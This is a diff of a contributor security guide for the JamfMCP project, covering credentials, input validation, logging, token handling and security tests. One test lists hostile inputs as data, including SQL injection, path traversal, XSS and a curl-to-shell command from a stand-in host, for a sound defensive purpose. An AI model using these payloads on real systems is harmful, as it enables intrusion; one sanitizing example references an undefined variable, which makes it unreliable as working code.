@@ -1,127 +1,288 @@
 (security_considerations)=
 # Security Considerations
 
-## Security Architecture
+:::{rst-class} lead
+Essential security practices for JamfMCP contributors to ensure safe and secure code
+:::
 
-### Credential Management
+:::{warning}
+Security is a shared responsibility. Every contributor plays a role in maintaining the security posture of JamfMCP. This guide outlines critical security considerations when developing features or fixing bugs.
+:::
 
-- **No Hardcoding**: All credentials from environment
-- **Token Rotation**: Automatic token refresh
-- **Secure Storage**: Use OS keychain when available
-- **Least Privilege**: Request minimal permissions
+## Core Security Principles
 
-### Input Validation
+### 🔐 Never Expose Credentials
+
+**All credentials must come from environment variables or secure storage**
 
 ```python
+# ✅ GOOD - Credentials from environment
+auth = JamfAuth(
+    server=os.getenv("JAMF_URL"),
+    client_id=os.getenv("JAMF_CLIENT_ID"),
+    client_secret=os.getenv("JAMF_CLIENT_SECRET")
+)
+
+# ❌ BAD - Never hardcode credentials
+auth = JamfAuth(
+    server="https://company.jamfcloud.com",
+    client_id="actual_client_id",  # NEVER DO THIS
+    client_secret="actual_secret"   # NEVER DO THIS
+)
+```
+
+### 🛡️ Input Validation
+
+**Validate and sanitize all user inputs before processing**
+
+```python
+import re
+from typing import Any
+
 def validate_serial(serial: str) -> str:
-    if not serial or not serial.strip():
-        raise ValueError("Serial cannot be empty")
-    # Additional validation
-    return serial.strip().upper()
+    """
+    Validate and sanitize computer serial number.
+
+    :param serial: Raw serial number input
+    :type serial: str
+    :return: Validated serial number
+    :rtype: str
+    :raises ValueError: If serial is invalid
+    """
+    if not serial or not isinstance(serial, str):
+        raise ValueError("Serial number must be a non-empty string")
+
+    # Remove whitespace and convert to uppercase
+    serial = serial.strip().upper()
+
+    # Validate format (alphanumeric, 10-20 chars)
+    if not re.match(r'^[A-Z0-9]{10,20}$', serial):
+        raise ValueError("Invalid serial number format")
+
+    return serial
+
+def validate_computer_id(computer_id: str | int) -> int:
+    """
+    Validate computer ID input.
+
+    :param computer_id: Computer ID as string or integer
+    :type computer_id: str | int
+    :return: Validated computer ID
+    :rtype: int
+    :raises ValueError: If ID is invalid
+    """
+    try:
+        id_int = int(computer_id)
+        if id_int <= 0 or id_int > 2147483647:  # Valid int32 range
+            raise ValueError("Computer ID out of valid range")
+        return id_int
+    except (ValueError, TypeError) as e:
+        raise ValueError(f"Invalid computer ID: {computer_id}") from e
 ```
 
-- **No Sensitive Data**: Sanitize error messages
-- **Structured Errors**: Consistent error format
-- **Logging**: Secure logging practices
+### 📝 Secure Logging
 
-### SOFA Integration
-
-Security vulnerability tracking via macadmins SOFA:
+**Never log sensitive information**
 
 ```python
-async def get_sofa_feed() -> dict:
-    # Fetch latest feed
-    pass
+import logging
 
-def get_cves_for_version(feed: SOFAFeed, version: str) -> tuple[set, set]:
-    # Analyze CVEs
-    pass
+logger = logging.getLogger(__name__)
+
+# ✅ GOOD - Log without sensitive data
+logger.info("Authenticating with Jamf Pro server")
+logger.debug("Processing computer ID: %s", computer_id)
+
+# ❌ BAD - Never log credentials or tokens
+# logger.info(f"Using credentials: {client_secret}")  # NEVER
+# logger.debug(f"Token: {access_token}")              # NEVER
+
+# ✅ GOOD - Sanitize error messages
+try:
+    result = await api_call()
+except Exception as e:
+    # Log error type without exposing internals
+    logger.error("API call failed: %s", e.__class__.__name__)
+    # Full details only at DEBUG level
+    logger.debug("Error details: %s", str(e))
 ```
 
-Features:
-- **Real-time CVE Data**: Latest vulnerability information
-- **Version Analysis**: OS currency assessment
-- **Exploit Detection**: Identify actively exploited CVEs
-- **Performance**: Efficient feed parsing and caching
+## Authentication & Token Management
 
-**External Services**
-- Jamf Pro API - Primary data source
-- SOFA Feed API - Security vulnerability feed
+### OAuth Token Handling
 
-## Secrets Manager
+The project uses OAuth2 client credentials flow with automatic token refresh:
 
-The following has not been tested whatsoever but hypothetcially could work.
+:::{admonition} Jamf Pro SDK
+:class: tip
 
-### AWS Secrets Manager
+For full documentation on Credential Providers, see the [Jamf Pro SDK](https://macadmins.github.io/jamf-pro-sdk-python/reference/credentials.html) official documentation
+:::
 
 ```python
-import boto3
-import json
+class ApiClientCredentialsProvider(CredentialsProvider):
+    """Secure OAuth2 token management."""
 
-def get_secret():
-    session = boto3.session.Session()
-    client = session.client('secretsmanager')
+    async def _request_access_token(self) -> AccessToken:
+        """Request new token with secure handling."""
+        # Token automatically refreshes before expiration
+        # Never log token values
+        # Token stored in memory only
+```
 
-    response = client.get_secret_value(SecretId='jamf-credentials')
-    secret = json.loads(response['SecretString'])
+:::{warning}
+**Token Security Rules:**
+- Never persist tokens to disk unless storing in keychain with the `keyring` library
+- Never include tokens in error messages
+- Never log token values at any level
+- Implement proper token cleanup on shutdown
+:::
+
+## Data Protection
+
+### Sanitizing API Responses
+
+Remove or mask sensitive data from API responses before processing:
+
+```python
+def sanitize_user_data(user_info: dict[str, Any]) -> dict[str, Any]:
+    """
+    Sanitize user information for safe handling.
+
+    :param user_info: Raw user data from API
+    :type user_info: dict[str, Any]
+    :return: Sanitized user data
+    :rtype: dict[str, Any]
+    """
+    # Remove sensitive fields entirely
+    sensitive_fields = ["password", "api_key", "token", "secret"]
+    for field in sensitive_fields:
+        sanitized.pop(field, None)
+
+    return sanitized
+```
+
+### Error Message Sanitization
+
+```python
+def create_safe_error_response(error: Exception) -> dict[str, str]:
+    """
+    Create sanitized error response for users.
+
+    :param error: The exception that occurred
+    :type error: Exception
+    :return: Safe error dictionary
+    :rtype: dict[str, str]
+    """
+    # Map specific errors to safe messages
+    error_map = {
+        ValueError: "Invalid input provided",
+        ConnectionError: "Unable to connect to service",
+        TimeoutError: "Request timed out",
+        PermissionError: "Insufficient permissions"
+    }
+
+    error_type = type(error)
+    message = error_map.get(error_type, "An error occurred")
 
     return {
-        'JAMF_CLIENT_ID': secret['client_id'],
-        'JAMF_CLIENT_SECRET': secret['client_secret']
+        "error": error_type.__name__,
+        "message": message
+        # Never include: stack traces, file paths, credentials
     }
 ```
 
-### Azure Key Vault
+## Testing Security
+
+### Security-Focused Tests
+
+Include security tests in your contributions:
 
 ```python
-from azure.keyvault.secrets import SecretClient
-from azure.identity import DefaultAzureCredential
+import pytest
+from unittest.mock import patch
 
-def get_secrets():
-    credential = DefaultAzureCredential()
-    client = SecretClient(
-        vault_url="https://your-vault.vault.azure.net/",
-        credential=credential
-    )
+class TestSecurityPractices:
+    """Security-focused test suite."""
 
-    return {
-        'JAMF_CLIENT_ID': client.get_secret("jamf-client-id").value,
-        'JAMF_CLIENT_SECRET': client.get_secret("jamf-client-secret").value
-    }
+    @pytest.mark.asyncio
+    async def test_credentials_not_logged(self):
+        """Ensure credentials are never logged."""
+        with patch('jamfmcp.auth.logger') as mock_logger:
+            auth = JamfAuth(
+                client_id="secret_id",
+                client_secret="secret_password"
+            )
+
+            # Verify no secrets in logs
+            for call in mock_logger.method_calls:
+                call_str = str(call)
+                assert "secret_id" not in call_str
+                assert "secret_password" not in call_str
+
+    def test_input_validation_prevents_injection(self):
+        """Test that input validation prevents injection attacks."""
+        malicious_inputs = [
+            "'; DROP TABLE computers; --",
+            "../../../etc/passwd",
+            "<script>alert('xss')</script>",
+            "$(curl evil.com/shell.sh | sh)"
+        ]
+
+        for evil_input in malicious_inputs:
+            with pytest.raises(ValueError):
+                validate_serial(evil_input)
+
+    def test_error_messages_sanitized(self):
+        """Verify error messages don't leak sensitive info."""
+        error = ValueError("Database connection failed at 192.168.1.100")
+        safe_response = create_safe_error_response(error)
+
+        assert "192.168.1.100" not in safe_response["message"]
+        assert "Database" not in safe_response["message"]
 ```
 
-### HashiCorp Vault
+## Dependency Security
 
-```python
-import hvac
+### Managing Dependencies
 
-def get_secrets():
-    client = hvac.Client(url='https://vault.company.com')
-    client.token = 'your-vault-token'
-
-    secret = client.read('secret/data/jamf')
-    return secret['data']['data']
+```toml
+# pyproject.toml - Pin versions for security
+[project]
+dependencies = [
+    "httpx==0.27.0",  # Pin to tested version
+    "pydantic>=2.0,<3.0",  # Allow patch updates
+    "fastmcp>=0.1.0",  # Minimum version for security fixes
+]
 ```
 
-## Network Security
-
-### Firewall Rules
-
-Required outbound connections:
-- HTTPS (443) to Jamf Pro server
-- HTTPS (443) to sofafeed.macadmins.io
-
-No inbound connections required for MCP operation.
-
-## Future Deployment Options - FastMCP Cloud
-
-Planned support for FastMCP Cloud deployment:
+### Security Scanning
 
 ```bash
-# Deploy to FastMCP Cloud
-fastmcp deploy jamfmcp
+# Check for known vulnerabilities
+pip-audit
+
+# Update dependencies safely
+uv pip compile --upgrade-package httpx
 ```
 
+## Code Review Security Checklist
+
+When reviewing code, check for:
+
+- [ ] **No hardcoded credentials** or secrets
+- [ ] **Input validation** on all user inputs
+- [ ] **No sensitive data** in logs or error messages
+- [ ] **Proper error handling** without information leakage
+- [ ] **Secure defaults** for all configurations
+- [ ] **Rate limiting** considerations for API calls
+- [ ] **Timeout settings** on all network requests
+- [ ] **Dependency versions** are current and secure
+
+## Additional Resources
+
 :::{seealso}
-- [FastMCP Deployment](https://gofastmcp.com/servers/deployment)
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
+- [Python Security Best Practices](https://python.readthedocs.io/en/latest/library/secrets.html)
+- [Jamf Pro Security](https://docs.jamf.com/jamf-pro/documentation/Jamf_Pro_Security_Overview.html)
 :::
